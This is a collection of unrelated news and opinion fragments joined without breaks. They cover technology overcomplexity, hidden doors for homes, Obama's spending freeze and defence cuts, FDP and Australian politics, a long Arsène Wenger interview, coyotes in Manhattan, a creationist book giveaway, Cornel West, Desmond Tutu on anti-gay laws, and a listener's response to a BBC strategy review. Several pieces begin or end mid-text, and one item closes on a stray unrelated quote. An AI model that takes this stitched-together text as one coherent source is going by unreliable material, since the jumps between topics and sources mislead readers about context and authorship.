It 's joined by the growing overcomplexity of life in general .
People spend enormous amounts of time and energy these days navigating automated help services and dealing with one complicated mess after another .
The relationship between people and their banks , insurance companies , health care providers and government has become hostile , maddening and exhausting .
The last thing people need is PC - related problems they do n't understand when , say , paying taxes online .
Technical people always complain about being buttonholed at every family get - together by relatives who want " free tech support . "
But why do they want this ?
Why do they need it ?
The answer is that consumer technology is overly complex .
And whose fault is it ?
Unfortunately , it 's my fault .
And possibly your fault .
It 's the fault of everyone , including marketers , who relentlessly call for more , more and ever more features .
Combine this with our calls for backward compatibility , and the result is systems that do everything .
They 're so feature - rich , so complex , that some people can't get them to do anything .
Look what I can't do !
I 've noticed a trend online recently of new services whose main feature is that they hardly do anything .
Twitter was the first major site in this new trend , which boldly asserted its limitations as features .
" You ca n't send more than 140 characters ! " " No pictures ! " " No formatting ! " " It does hardly anything ! " Welcome to the future .
Hard to believe now , but remember when MySpace was the dominant social network ?
MySpace gave us so many features that people could , did and do plaster their profiles with incredible ( usually incredibly ugly ) customization .
It was early with apps and add - ons .
Not Facebook .
It turns out that social networking fans wanted a closed system , locked down and feature - limited .
I 've noticed this trend in the reminders and to - do - list world .
Once , most people used an organizer application , like Microsoft Outlook , to manage their to - do lists .
Then a new wave of more limited task managers rolled onshore with the Web 2.0 tsunami .
Remember the Milk was typical of the first wave .

For as long as Spot Cool Stuff has been fantasizing about the house of our dreams — the mansion we would build if money were no object — our imaginary plans have included trap doors , secret rooms and hidden passageways .
For some time , we assumed that installing a hidden door in real life would require a hiring a general contractor who would surely shoot us a suspicious look when we explained what we wanted .
But once we started doing the research we learned that there are over a dozen companies with the specialty of installing stealth entrance ways .
Some even stock pre-built hidden doors you can install yourself !
And you need n’t have a spooky mansion , eccentric tastes or a now - it - puts - the - lotion - in - the - basket creepiness to you to have a secret door either .
There are several reasons why you may want to consider having a hidden door in your house .
Primary among those reasons : space efficiency .
A normal door occupies wall area that could otherwise be used for , say , a bookshelf .
Do you have a room or storage area you do n’t need frequent access to ?
Hide the entrance to it behind a fireplace , staircase , mirror , wall panel or a painting .
Some people have hidden doors for security reasons .
To conceal a vault , for example .
Or to hide a panic room made popular by the 2002 Jodie Foster flick .
Mostly , though , we think there ’s something about a hidden door that ’s magical — and exceptionally cool .
Check out the photos , below .
Companies that specialize in hidden doors
This is by no means a complete list :
Creative Home Engineering — Spot Cool Stuff ’s favorite hidden door company .
They have the most creative designs and build all types of hidden entryways included armored doors and doors with biometric access control .
The Hidden Door Company — Specializes mostly in bookcase hidden doors but will manufacture designs specific to your situation .
Niche Doors — has high - quality pre-built hidden doors made of wood .
Hide A Door — offers some of the most inexpensively priced hidden doors .
Their website has a form where you can request a free quote .
Space San Diego — deals with an array of space saving and optimizing furniture , not only hidden doors but also Murphy beds and stacking stools .

The results of the special election for the Massachusetts Senate seat once held by Ted Kennedy reverberated like a  shot heard round the world or at least one heard round Washington .
All the spending lately in Washington has apparently alienated the political independents that Barack Obama won in November 2008 .
And the president gets the messageor at least he is making a good show of it .
His new proposal is a severely qualified three - year spending freeze , covering only about an eighth of the federal budget .
The proposal covers only discretionary spending ,  programs that Congress appropriates money for each year , and leaves out the faster growing entitlement programs , such as Social Security , Medicare , and Medicaid , which are ballooning on automatic pilot .
Admittedly , entitlement programs are hard to cut , because . . . well . . . people feel entitled to their government handouts .
Yet Obamas proposed spending freeze , which in fiscal year 2010 will save only a measly $ 10 - $ 15 billion in a $ 3.5 trillion annual federal budget , doesnt even cover all discretionary spending .
Exempt are the Departments of Defense and Homeland Security and foreign aid .
Yet DoD spending alone , with the Cold War long over , is the greatest in inflation - adjusted terms since World War II and has doubled since George W. Bush took office in 2001 .
President Obamas rationale for not including these security expenditures in his discretionary spending freeze is that he is prosecuting two wars .
Aside from the obvious solution of ending the two conflicts which are part of the war on terror  but have had the counterproductive effect of increasing retaliatory terrorism and cutting back the defense budget , defense spending could be reduced even if the two war efforts are sustained .
Just as Obama used the economic crisis to try to pass an unrelated and expensive health care bill , George W. Bush used the 9/11 attacks to conduct an unrelated invasion of Iraq , which he then used as an excuse to pump up the defense and non-defense budgets .
Although Obama has deepened the national debt and budget deficit , most of the two are still mostly Bushs , because his reckless spending lasted eight years and Obamas has only been going for a year so far .
Still , despite different political rhetoric , some things never change in Washington .
So why doesnt Obama at least freeze security spending ?
Could it be that the war on terror requires Cold War - like resources to be successful ?
No , the intelligence , drones , and CIA and Special Forces operations to conduct a real , covert , and more effective war on terror are reasonably cheap .
The real answer as to why there is no defense spending freeze : Because Democrats are always scared of being called wimps  on national security issues likely the same reason Obama had to support at least one overseas war and thus reluctantly escalated the Afghanistan conflict .
Even if the Afghan war is considered necessary , however , it has nothing to do with most of the defense budget .
A large part of that budget is doled out to special interests , including defense industries and even uniformed service members .
So here are some suggestions of items that could be cut from the defense budget without harming national security .
The Navy could cancel the CVN - 79 aircraft carrier , terminate the building of littoral combat ships and LPD - 26 - class amphibious vessels , stop production of exorbitantly expensive DDG - 1000 Zumwalt - class destroyers , and terminate production of SSN - 774 Virginia - class submarines .
The Navy has little relevance to the war on terror and , with existing equipment , has crushing dominance over any other fleet in the world .
The Air Force should stop production of C - 17 aircraft , which are expensive compared to sealift , and delay production of the F - 35 Lightning II Joint Strike Fighter until flight tests have been satisfactory .
The Marines should cancel the MV - 22 Osprey aircraft ; the range and speed advantages over existing helicopters are not worth the much higher cost .
The Army and Marines should end expansion of their forces .
Adding more soldiers is very expensive because of added salaries , benefits , equipment , and support .
If any presidential administration feels it needs to use military force against terrorists , it should be employed only sparingly after law enforcement methods have failed , and with a lighter footprint so that it doesnt fuel the Islamist fire that it seeks to dampen .
Thus , if the United States is not conducting counterproductive occupations of Muslim lands to ostensibly quell terrorism , the ground forces need not be augmented , and even can be reduced .
This reduction should allow cutting the weapons and equipment that are purchased for such forces .
Finally , there are loads of pork in the foreign aid and homeland security budgets that could be extracted .
At most ( and even this is a stretch ) , Obamas proposed limited spending freeze will result in a savings of only 3 percent of the ballooning budget deficits in the next 10 years .
To avoid his predecessors reputation of spending like a drunken sailor ,  Obama must include massive entitlements and discretionary security spending in his budget cutting for it to be serious .

Liberaler Klüngel FDP - Reiseaffäre weitet sich aus
Neuer Ärger für die FDP : Nach SPIEGEL - Informationen war die Firma , an der Guido Westerwelles Bruder beteiligt ist , auch mit Wirtschaftsminister Brüderle unterwegs .
Zudem wurde Westerwelles Partner Michael Mronz stärker protegiert als bislang bekannt .
Federal Opposition Leader Tony Abbott says he wants to bring back parts of the Howard government 's workplace policy to make industrial laws more flexible .
Mr Abbott says the former government 's WorkChoices policy is dead .
But he says he would relax unfair dismissal laws for small businesses and reintroduce statutory non-union contracts if he wins the election .
" We want to make it possible for business to be more profitable and for workers to earn more , " he said .
" That 's what we had under the Howard government .
That 's what we need to have again as we go forward in this country . "
Mr Abbott predicts businesses will limit their opening hours on weekends because of current workplace laws .
The Government says its changes are simpler for businesses and give employees better protection , but Mr Abbott says the laws have boosted penalty rates and led to rising wage costs for employers .
He says employers , workers and consumers are worse off under the Government 's laws .
" There will be nothing open after midday on Saturday , " he said .
" [ Kevin Rudd ] wants to bring back the church Sunday for all of us , because there 'll be nothing else to do on Sunday under Labor 's laws but go to church .
" There certainly wo n't be any shops open if he has his way . "
Deputy Prime Minister Julia Gillard says the proposals would be a backward step for workers .
" There 's an old saying , if it waddles like a duck and quacks like a duck , then it is a duck , " Ms Gillard said .
" If it has in it individual statutory contracts that rip the safety net away , if it has in it the loss of unfair dismissal rights , then it is WorkChoices . "
Ms Gillard says the Government 's workplace relations laws are fair .
" When we look at our most recent industrial action statistics of our new Fair Work laws , industrial action went down , " she said .
" Of course what we 're seeing across the economy is very modest wages growth and that 's a reflection of our economic conditions . "

Arsène Wenger does not , in the normal run of play , give interviews .
Or rather , Arsène Wenger does not give interviews beyond the pre-match briefings and the post - match reactions , when he stands in front of all those little logos and explains why his Arsenal team have won , or could or should have won .
They are for the aficionados , these after - match managerial interviews , absent in shade and contemplation , full of the lingering fizz and frustration of these men who send out their teams and then can mostly only watch , sit , stand , fidget , glower , chew nails and gum .
Wenger , though , is always interesting .
To begin with , he does not seem quite right as a football manager .
Rarely has someone looked so good in a suit and so bad in an anorak .
Tall , fastidious , an air of the intellectual ; not as rakish as your average structuralist , perhaps , but definitely un homme serieux .
Such niceties did n't trouble English football when the little - known Wenger arrived in 1996 to coach one of the few English clubs to rival Manchester United in fame and éclat .
He instantly became " The Professor " , and has so stayed , through the two " doubles " and the unbeaten season , to this day retaining the undimmed admiration of a large part of north London and beyond .
But it 's a good nickname , and not just because Wenger has a master 's degree in Economics from his home - town university in Strasbourg .
His approach is a touch more donnish than is usual .
( I once asked Kenny Dalglish of Liverpool for his prediction on a Wembley final : " It 'll be sunny " was his entire response .
He was right , though . )
The Arsenal manager also speaks that French - accented English which lends great authority even to the statements of Chief Inspector Jacques Clouseau .
To listen to Wenger 's careful elucidations , adorned by mots justes occasionally and winningly misplaced , is to be intellectually convinced , that , yes , they were robbed .
Who better , then , to bring some sagacité and finesse to the current debate about the tawdry rapaciousness of the culture of our football ?
Even those untouched by the English mania for its national game must be aware of the enthusiastic extramural activities of certain leading players .
And if not , someone recently heard a Premier League club grandee offer this helpful summary : " We pay them too much money and they fuck everybody . "
But , Arsenal usually explains , if Wenger did agree to expound and dilate on such matters , he would have no time to coach football .
And , it has to be said , if you look elsewhere for those most gifted in defending the game off the pitch , they have a point .
Today , though , is different .
Wenger is sitting high up in Arsenal 's Emirates stadium , in one of the private boxes ( from £ 4,500 a game , in case you 're wondering ) appointed in the style football likes : four - star hotel .
And he is happy to talk about football and morality , its duty and beauty , how good a player he really was , and whether , in fact , he 's too intelligent to be a football manager at all .
It 's because he wants publicity .
Not for himself – nothing so flagrant – but for Arsenal 's work in the community , here in north London and around the world : in South Africa , Bosnia and Kenya ; in the Chernobyl - devastated town of Chernigov ; in Egypt and Israel , fostering better relations between Arabs and Jews .
Home and abroad , football as a force for good , the allure of the great name opening doors , eyes and opportunities , bringing coaching , flattering attention and lasting help .
The surprise is , amid all the hype and the hoopla – the trivia and the tosspots , the criticism and the disdain – that football does n't make much more of this work .
Arsenal are the pioneers : today is a celebration of 25 years of their community programmes , 5.5 million hours of them , involving 1 million people , helping the aged , the young , the excluded and the unfortunate .
The Premier League clubs will invest about £ 100 m in the community this year .
In addition , the Premier League centrally will spend £ 136 m on football - related community projects at home and internationally .
A bit too worthy , this aspect , possibly ; not sexy enough – not next to Rory Delap 's long throw , a tactic employed by Stoke , who on the day of our meeting were Arsenal 's next opponents , a fact which has taken up quite some time at Wenger 's press briefings following the community - programme celebration earlier on .
This had been addressed by Wenger in true Professorial style : he asserted that the achievement of happiness for a football club could be divided into three parts , numbering results on the pitch after respect for the club 's traditions and the responsibility to help the community .
" The moral values I 've learnt in my life I 've learnt through football , " he said .
" As a club we have an educational purpose , to give back to those people who love Arsenal so that they learn moral values from our game and how we behave . "
Not the sort of stuff , on the whole , that you get from the " ashen - faced " Ron Knee , Private Eye 's satire on the archetypal English coach .
( My own real - life favourite was the remark made by one manager about Neil Webb , sometime England international midfielder , later a postman : " Webby 's not just special .
He 's special special . " )
Up in the VIP box , Wenger later expands on football and life , duty and beauty .
" I believe a big club must have the ambition to win with style ...
You know , there is a famous saying , that the only way to deal with your life is to transform it into art , every minute of your life .
Football is an art , like dancing is an art – but only when it 's well done does it become an art .
If you see me painting , that is not an art .
If you see my wife painting , that is art . "
Several things there .
First ,
Wenger has more of a sense of humour than you might imagine ; he even made a joke earlier on about Rory Delap .
Second , he has created at Arsenal teams that insist on such style ; even , some say , at the expense of winning , although he is too sensible to confirm it outright .
Third , he has a wife and a young daughter who remain sensibly private : his wife , a former international basketball player , watches every Arsenal game , but at their home in the north London suburbs , on the television .
" She is not a fanatic but she likes watching sports , " he says .
" No , she does not have much choice ... "
Does he paint ?
No .
He is 60 now , with no plans to retire .
Does he have other interests ?
Yes , but football dominates .
" You know the story about the guy who 's a promising pianist ?
One day he goes to a concert and he hears a fantastic pianist .
So he goes to see him after the concert , and says to him , ' I would give my life to play like you ' " – Wenger pauses for effect and emphasis – " And the pianist replies , ' That 's what I have done . ' "
It 's 7:30 in the morning at Haverstock School , the comprehensive below Hampstead , north London , that is partly responsible for the Miliband brothers .
The sports hall is full of 11 - to 14 - year - olds ready to play football .
The early start , they say , " wakes you up " .
It also encourages them to come to school .
Young Abubakar has already had trials with Everton and Reading ; Mohamed would love to be a professional footballer as well .
" Tell Fabregas to call me , " he jokes .
Shortly thereafter , a team - mate of the said Arsenal captain arrives : Bacary Sagna , the French international full - back .
He has travelled from his home in the suburbs .
He joins the Arsenal community staff in a bit of coaching and chatting to the boys .
Sagna is also involved in other community initiatives , including the Arsenal Double Club , set up after the 1998 league and FA Cup triumph to use Arsenal and football as a hook and incentive to learning , in schools , on the local estates , in prisons .
It 's a frame of two halves : 45 minutes with Arsenal - related learning aids , 45 minutes playing football .
" I'm here to make them believe they can realise their dreams , like I did , " says Sagna , " and to tell them to do well at school .
I could have failed ; they need something to fall back on . "
Sagna is clear that he is a role model : " It 's a massive thing .
When you 're young you want to be like the footballers , to act like them .
If the footballers do something wrong on the pitch or off the pitch , they want to do the same thing ...
Recently there have been some stories about footballers ...
You have to show an example . "
Many people will tell you that foreign footballers are much more sophisticated than the native variety , who have rarely travelled so well .
The image of the British footballer is overpaid and under-educated .
One of their own , the much troubled and much reformed Joey Barton , now of Newcastle United , recently summed this up for the listeners of the BBC Today programme : " Most footballers are knobs , " he said .
Even though he is often criticised for fielding mostly foreign players , Wenger does n't accept their innate superiority .
" English players are as easy to coach .
The problem is that the Premier League has the best players in the world , and statistically not all of them can be born in England .
But we do n't have enough English players : we are working very hard on it . "
Being Wenger , he draws a comparison with London as an international financial centre with international employees .
Mention of finance reminds one that Wenger , famously and rarely , believes in balancing the books .
He once outlined for Glenn Moore , The Independent 's football editor , how , when Arsenal decided to build their new £ 390 m stadium , he resolved to concentrate on developing young players rather than buying proven ones , also arguing that it was " the best way to create an identity with the way we play football , to get players integrated into our culture , with our beliefs , our values ...
I felt it would be an interesting experiment to see players grow together with these qualities , and with a love for the club ...
It was an idealistic vision of the world of football . "
He is also renowned for refusing to sanction excessive salaries for his players – and this has led several to move on to other clubs for more .
So , in that way of journalists looking for easy précis and a simple theory , I had been erecting a philosophy for Wenger and Arsenal of football as a matter of morality , of doing , in that pervasive Labour phrase , " what is right " , on the field , off the field , wherever .
Wenger sniffed it , rolled it round a bit , and did n't quite give one of those Gallic sighing shrugs which wearily indicate that life is n't so simple .
Balancing the books was merely logical , he replies – not paying players too much was just part of that .
Any other way would have led to what happened to Portsmouth , the Premier League club recently placed into administration .
Fabio Capello , the England coach , believes the heady mix of youth and too much money is the root of all off - field problems – so does Wenger agree that footballers are generally over - paid ?
" That is not for me to decide .
That is a society choice .
My target is to make the players as rich as possible within the financial constraints of the club .
My target is not to give them less money .
I 'm happy to make them rich . "
The subject of the players ' behaviour receives similar circumspection .
" I believe you can exaggerate the responsibility of footballers , that they should all be candidates for Paradise , " Wenger says .
" Private life is private life .
Off the pitch , there is private life , and the rest is social life , where of course you have to behave responsibly . "
In France , though , " John Terry would have made zero headlines , " he says .
Was this because the French are more sophisticated ?
" I would n't want to say that .
I do n't say it 's better , just different . "
The press is nosier here , though , and privacy laws are less strict : " In some ways England is more liberal than France , but I also find it more intrusive .
But when you go abroad you have to accept the ways of where you live .
I have to respect that . "
So : Easy Theory 0 , Wenger 4 .
" Are you , " I ask him , " too intelligent to be a football manager ? "
" You can never be intelligent enough , " he replies .
it 's 3:30 in the afternoon at St Mary Magdalene Academy in Islington , north London .
A small boy has just done a double take , similar to the kid in the television advert who spots Lewis Hamilton by the roadside .
He has noticed Manuel Almunia , the Arsenal goalkeeper , on the way to a Double Club session , involving small boys and girls throwing a ball at him and shouting out numbers in Spanish .
Almunia does n't drop it once .
Whatever else , foreign players are clearly a considerable advantage for local schoolchildren anxious to acquire a second language .
French is particularly well served , and Spanish ; German has suffered a little since Almunia 's predecessor , Jens Lehmann , departed , but as one of the community workers puts it , " Arsène has stepped in from time to time . "
( Indeed Wenger speaks French , English , German and some Italian , Spanish and Japanese – he coached in Japan after time in France and Monaco and before Arsenal . )
There is a clause in the players ' contracts covering these community activities , but Arsenal have never had to rely on it .
Almunia enjoys , he says , " seeing the kids happy " .
He has also worked with the Teenage Cancer Trust , a former Arsenal " Charity of the Season " , the scheme responsible for raising £ 2 m since 2003 .
" That was really difficult , visiting hospitals and seeing kids with cancer , " he says .
" It opens your eyes .
Footballers live in a bubble – sometimes it 's good to get into the real life . "
As you can see , goalkeepers tend to be thinkers ( other custodians have included Arthur Conan Doyle , Albert Camus , Pope John Paul II and the Nobel Prize - winning physicist Niels Bohr ) .
It 's probably all that time spent alone .
For the record , Almunia thinks the current bad publicity goes with the territory : you get the money , so you have to take the bad times with the good .
He even thinks that journalists are just doing their job , providing what people want to hear : " I 'm interested in gossip .
People like to have things to talk about in the pub . "
Back in the VIP box , Wenger is defending Britain : " I like to live here , " he says , " if I did n't I would n't have been here for 13 years . "
The British are more optimistic than the French .
" There are plenty of aspects I like in this country .
For example , the passion , the generosity .
This kind of work that we have been celebrating today , you would n't find one club in France , not one , that does that .
The work for charity that exists here does n't exist in France in that quantity .
Unfortunately , for every human quality , there is a weakness when it is put to excess . "
Wenger is talking about the ugly side of football passion , the racist chants and worse , directed at him in particular from opposition supporters , because of his accentuated foreignness , the Professoriality .
" It 's the kind of racial abuse that is a hate of difference , " he reflects .
Difficult , though , I say , in a sport where the dynamic is rivalry and hyping of difference , even in the same city .
" I ask you the question : do you need to hate the other club to love your club ? "
Indeed .
But his point about passion , weakness and excess is applied by some to him .
There is passion and pragmatism as well as calm and logic : he does get a bit carried away at times .
In short , he is often called " a bad loser " – " Arsène Whinger " .
He did n't demur when I put it to him that as a son of Alsace , he has elements of both the French and the German about him ( his parents ran a bar and car spare - parts business ) .
If there had been time , I 'm confident he would n't have been as keen on my view of him as a mixture of French flair and passion and German calm and efficiency .
( Stereotype , by the way , is " stereotype " in French and " stereotyp " in German . )
In the game at Stoke to come , Arsenal won , despite , yes , the Rory Delap long throw .
But there was also a horrific tackle which broke the leg of Arsenal 's young Welsh player , 19 - year - old Aaron Ramsey , savagely illustrating the fragility of a football career .
Afterwards , in the bright light , Wenger called the tackle unacceptable , and made the point that three broken legs for his players in three years was no coincidence , bringing a furious response from the Stoke manager , Tony Pulis .
Wenger , like other extremely successful football managers such as Alex Ferguson and Brian Clough , does not play the game .
" I come out honestly with what I think , " he says .
Is he a bad loser ?
" I do n't deny I 'm a bad loser , because in my job if you 're a good loser you do n't go a long way .
I have been 27 years in this job and I 've won more games than I have lost , you know . "
( And in the early days , he was often physically sick if he lost . )
Some object to the lofty air of the high ground about Wenger , a feeling that book - balancing and home - growing confers an invincible superiority , even when they lose .
But that is to ignore the wry amusement , the warmth , the droll and the nuanced in him .
I ask him about his professional playing career , for example .
Just the 12 appearances for RC Strasbourg .
Was he any good ?
" Better than people think , " he says firmly , before adding that nobody can check because there is n't any video .
I have one last question : is n't it odd how similar his first name is to the club's ?
Yes , he replies .
" You could call it coincidence , I prefer to believe in fate . "
Is he religious ?
Being Arsène Wenger , he says he is more interested in religions than religion .
And now he really has to go .
Back at Haverstock School , Sagna is taking aim at a target bearing the logo of the 25th anniversary celebrations .
Watching is Alan Sefton , the head of Arsenal in the Community , celebrating 24 years himself , and , not surprisingly , full of it , from the early days of sponsoring the local bowls team to its current sports traineeships and the Arsenal Learning Centre , part of the stadium project which has created nearly 2,000 long - term jobs and 2,500 affordable homes .
It 's moving to watch people who have been given help talk at the celebrations .
And not bad marketing , either , I suggest .
" There are , " says Sefton , " easier ways of selling tickets . "
The football continues .
Abubakar releases a kick of intimidating power and energy , misses , and smiles ; a smaller , frailer boy scores two goals and then takes a discreet break for a puff on his asthma inhaler before dashing back : I can see what Arsène and Arsenal meant and means .
Sagna hit the target , by the way .
Wile E. Coyote and friends are invading Manhattan .
Three coyotes turned up on the Columbia University campus on Sunday morning , prompting an e-mail alert to students and faculty .
A few hours later , a coyote was spotted darting around bushes and across a frozen lake in Central Park .
Urban coyote authorities say the dogs will likely be seen more and more in big cities as they fight one another for living space .
PHOTOS : COYOTES IN MANHATTAN
“ It ’s not uncommon at all , and it ’s going to increase in frequency , ” Dr. Stanley Gehrt of Ohio State University said of coyote sightings in cities .
Columbia ’s public - safety officials said the coyotes were spotted in front of a campus building near 119th Street and Broadway .
Someone called 911 , and police saw one of the coyotes before it left the campus , apparently near 120th Street .
Later , in Central Park , photographer Neill Engler was walking along the 72nd Street transverse when he spotted a coyote running back and forth near The Lake and a gazebo .
“ I was very shocked but pleasantly surprised that wildlife has returned to Central Park , ” said Engler , who recognized the animal based on his experience with them on California trails .
Gehrt and fellow coyote expert Dr. Paul Curtis of Cornell University said coyotes are coming to cities because they are being forced to seek out new territory .
“ The peak of breeding is right around this time of year , ” Curtis said .
“ The young animals get kicked out of the home because their parents are preparing to breed . ”
As a result , young coyotes migrate south along train tracks , cemeteries and other green patches from Westchester County and other points north .
Green spaces , like parks and college campuses , provide a food source , like small rabbits , Curtis said .
“ They ’re pushing themselves into the city , and what they found in the city is that life is n’t so bad , ” Gehrt said .
Columbia warned its students and faculty “ not to approach these animals . ”
That ’s the right policy , experts say , even though coyotes are not as ferocious they are sometimes depicted .
“ I ’ve been up close to them a number of times , ” Engler said .

A creationist plans to give away 1000 copies of his version of Charles Darwin 's On the Origin of Species after Richard Dawkins ' appearance in Christchurch on Thursday .
New Zealand - born author Ray Comfort , who is now based in the United States , has written his own introduction to Darwin 's groundbreaking work on evolution , where he argues for intelligent design .
Melissa Day , of Comfort 's New Zealand Living Waters Ministry , said the group planned to give away about 10,000 copies of the book today on university campuses in Auckland , Wellington and Christchurch .
Canterbury volunteers also plan to give out 1000 copies of the book , with Comfort 's foreword , after Dawkins ' appearance at the Christchurch Town Hall .
Dawkins , an atheist and evolutionary biologist , will be speaking at The Press Literary Liaison about his new book , The Greatest Show on Earth , in which he outlines the case for evolution .
Day said Comfort wanted the books handed out after the Literary Liaison because " Richard Dawkins is giving one side of the argument and trying to censor the other " .
" The 54 - page introduction has information on Darwin himself , his life and what his theories led to in quite a few instances .
It talks about his views on black people and women and it argues for intelligent design , " Day said .
Dawkins was unavailable for comment .
" I do n't know how much God has to do to get the attention of the politicians .

Cornel West : Obama is for big business not the jobless ( VIDEO )
Educator Cornel
West sat down with the Grio to discuss how unemployment is affecting African - Americans .
The Grio asked West about national unemployment trends for African - Americans .
He called on President Barack Obama to implement a comprehensive jobs policy — a program that would mirror former President Franklin Delano Roosevelt ’s New Deal , and focus primarily on creating jobs for people without a college education .
” [ It ’s ] the same way we had an investment banker policy when they were in trouble , ” West said of what he views as a double - standard in current economic policy .
“ All AIG needed was a push .
So let ’s help push these poor people , these working people into jobs with a living wage . ”
West , who has been outspoken in both his support and criticism of Obama , said the current administration has not made poor people a priority .
“ Obama has an economic team that ’s composed of persons who have no history whatsoever of being concerned about poor people , ” West said .
“ Obama ’s been doing a good job of reassuring the establishment .
But there ’s many of us who believe the establishment is on our necks . ”
The Princeton University professor is busy promoting his new book , Brother West : Living and Loving Out Loud .
The memoir is a departure from West ’s previous books , where he focused primarily on issues such as race and social justice .

In a strongly worded op - ed in the Washington Post published today , Nobel Prize winner Archbishop Desmond Tutu condemned the anti-gay legislation under consideration in Uganda and Rwanda .
Gay , lesbian , bisexual and transgendered people are part of so many families .
They are part of the human family .
They are part of God ’s family .
And of course they are part of the African family .
But a wave of hate is spreading across my beloved continent .
People are again being denied their fundamental rights and freedoms .
Men have been falsely charged and imprisoned in Senegal , and health services for these men and their community have suffered .
In Malawi , men have been jailed and humiliated for expressing their partnerships with other men .
Just this month , mobs in Mtwapa Township , Kenya , attacked men they suspected of being gay .
Kenyan religious leaders , I am ashamed to say , threatened an HIV clinic there for providing counseling services to all members of that community , because the clerics wanted gay men excluded .
Uganda ’s parliament is debating legislation that would make homosexuality punishable by life imprisonment , and more discriminatory legislation has been debated in Rwanda and Burundi .
These are terrible backward steps for human rights in Africa .
Our lesbian and gay brothers and sisters across Africa are living in fear .
And they are living in hiding — away from care , away from the protection the state should offer to every citizen and away from health care in the AIDS era , when all of us , especially Africans , need access to essential HIV services .
That this pandering to intolerance is being done by politicians looking for scapegoats for their failures is not surprising .
But it is a great wrong .
An even larger offense is that it is being done in the name of God .
Show me where Christ said “ Love thy fellow man , except for the gay ones . ”
Gay people , too , are made in my God ’s image .
I would never worship a homophobic God .

In responding to the BBC ’s strategy review , I provided answers to several questions which I now feel moved to share publicly .
After all , this is OUR service and we should share our views on everything relating to it not only with them but with each other .
I strongly encourage everyone who feels strongly about the BBC ’s proposal to close certain of their services to take time out to complete the survey which can be found at this address : https://consultations.external.bbc.co.uk/departments/bbc/bbc-strategy-review/consultation/consult_view.
You can answer as many or as few questions as you like .
If you care about the services you pay for , this is the best way to express your views .
So , without further ado , here is my take on the questions that matter to me .
The BBC 's strategic principles
The Director - General has proposed five high level principles which would set the future direction of the BBC .
These are :
• putting quality first , including five areas of editorial focus for all BBC services • doing fewer things better – including stopping activities in some areas • guaranteeing access for all licence fee payers to BBC services • making the licence fee work harder – being efficient and offering better value for money • setting new boundaries
The Trust agrees that the BBC should have a set of published principles and , when these are agreed , we will ensure that the BBC is held to account for achieving them .
Some of the proposed principles are in response to challenges the Trust has set the BBC – such as focussing on high quality programmes and considering whether the current range of services is too large .
We endorse these five principles , although we have not agreed to specific proposals in each area .
Do you think these are the right principles ?
Whilst I understand that like any broadcaster or business you have to manage your funds carefully , I strongly disagree with your plans to get rid of 2 excellent stations on the grounds that they have a comparatively tiny listenership .
As a license payer who listens to and enjoys programmes on both stations , I feel that you are going against your principle of making my license fee work harder and offer value for money .
I ( and I know that I speak for thousands ) have little interest in Radio 1 and 2 , and if / when I lose my favorite programmes on 6 Music and Asian Network , the BBC will no longer offer me music programmes that I can enjoy or identify with .
I should also point out that as a struggling independent musician you would be getting rid of 2 extremely valuable platforms for my non-commercial music .
Should the BBC have any other strategic principles ?
I play no part in running the BBC - I do n't know what your budget allocations are , how much you collect in licence fees , or what other revenue streams you get from oversees licensing , etc .
I can only speak as an outsider looking in with regards to how you manage your funds and what strategies you put in place .
But since you ask , it seems ludicrous that you pay salaries of up to £ 18 million to the likes of Jonathan Ross and then wonder what cuts you should make .
I 'm aware that Ross took a pay cut , but he's not the only one who commands an eye - watering salary .
I should also point out that I ’m a fan of the Jonathan Ross Show and of his film reviews – I think he ’s something of a British institution like the BBC itself .
But that does not justify the money you see fit to pay him and other high profile BBC personalities .
Is it really appropriate for a public service paid for by the People to spend such a large percentage of its income on just a few of its people and then decide to axe 2 stations paid for and loved by its licence payers ?
To me this presents itself as a gross mismanagement of priorities .
Proposed principle : Putting Quality First
We know that you have very high expectations of BBC programmes and services .
We also know that most BBC programmes and services meet audience expectations , but that some do not .
The Trust will always push the BBC to do better in this respect and we 're keen to know what you think .
Which BBC output do you think could be higher quality ?
I can't comment on the quality of BBC services I do n't watch or listen to - my reasons for not paying them much attention are down to personal preference , not issues with quality .
As for my favourite programmes on 6 Music and Asian Network - Tom Robinson Introducing , Guy Garvey 's Finest Hour , Pathaan 's Musical Rickshaw and Bobby Friction - I have no complaints whatsoever .
These programmes are engaging , fun and a brilliant showcase for music I would n't have otherwise come across .
I would be devastated to loose any of them .
Offering you something special
The Trust believes that the BBC needs to do more than offer high quality programmes and services .
We know that your expectations of the BBC are that it offers something special to you – something distinctive and better than other broadcasters .
For example , the BBC should offer you thoroughly independent and impartial news , it should introduce you to new talent in drama and comedy , and its radio stations should play pop music that other radio stations do n’t .
The Trust knows that you think the BBC could do more to be original and different in some areas .
Which areas should the BBC make more distinctive from other broadcasters and media ?
In the spirit of the late great John Peel , the BBC should continue to give underground , alternative and new music a platform - for artists and listeners alike .
Radio is awash with tired , commercial music with little or no imagination .
There are one or two commercial stations which give unsigned acts a chance to get their music aired , but the style of music mimics what is already in the charts .
The only other program I can think of ( apart from the ones which are in danger of being axed ) that plays refreshingly different sounds is Charley Gillett 's World of Music on BBC World Service .
The Five Editorial Priorities
The Director - General 's proposed editorial priorities are :
• The best journalism in the world •
Inspiring knowledge , music and culture • Ambitious UK drama and comedy • Outstanding children ’s content
• Events that bring communities and the nation together
These priorities are praise - worthy and meet with international expectations of a world class service .
All apply to the very services you intend to get rid of .
Proposed principle : Doing fewer things and doing them better
The Trust believes that BBC must offer the highest quality programming .
We have previously told the Director - General that we think that the pursuit of higher quality may mean doing less overall .
The Director - General has proposed a number of areas where the BBC could reduce or stop activities altogether .
The suggestions are to :
• Close Radio 6 Music and focusing the BBC ’s pop music output on Radio 1 and Radio 2 • Close Asian Network as a national service and aiming to serve Asian audiences better in other ways on other BBC services • Change BBC local radio stations , by investing more in breakfast , morning and drivetime shows , but share content across local stations at other times of the day •
Close the BBC ’s teen zone , BBC Switch • Close the teenage learning offer Blast !
• Make the BBC ’s website smaller , with fewer sections .
( We do not yet have the details of what will be cut )
We welcome your views on these areas .
I cannot stress enough how strongly I object to plans to close Radio 6 Music and Asian Network .
You say that you plan to focus your " pop music output " on Radio 1 and 2 , and this is exactly where my objections lie .
The music output on the doomed stations is predominantly not " pop " .
There is clearly no place for it on Radio 1 and 2 , and I can not see how this will change .
As for closing BBC Switch and Blast , while I know much less about these areas of the service it seems a bad choice .
Your proposed cuts directly contravene your editorial priorities : to present " Inspiring knowledge , music and culture " ; " Outstanding children ’s content " and " Events that bring communities and the nation together " .
Proposed principle : Guaranteeing access to BBC services
The growth of digital technologies and platforms has led to greater choice and convenience for many people in terms of how they receive and consume TV and radio programmes .
Many of the BBC ’s TV , radio and online services are now delivered to you in several ways .
